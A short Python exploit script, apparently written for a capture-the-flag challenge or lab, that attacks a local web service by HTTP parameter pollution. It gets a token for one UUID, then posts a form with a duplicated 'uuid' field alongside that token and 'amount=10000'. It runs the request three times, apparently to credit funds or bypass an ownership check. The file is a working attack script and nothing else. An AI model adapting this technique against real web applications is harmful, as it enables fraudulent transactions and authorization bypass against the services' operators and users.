import uuid

import requests

RHOST = "127.0.0.1"
RPORT = 9001

TARGET_URL = f"http://{RHOST}:{RPORT}"

global_uuid = str(uuid.uuid4())

def get_token():
    response = requests.get(f"{TARGET_URL}/get_token/{global_uuid}&")
    return response.text

def pollute():
    token = get_token()
    print(token)
    response = requests.post(f"{TARGET_URL}/pollute", headers={"Content-Type": "application/x-www-form-urlencoded"}, data=f"uuid={uuid.uuid4()}&uuid={global_uuid}&token={token}&amount=10000")
    print(response.text)


if __name__ == "__main__":
    for i in range(3):
        pollute()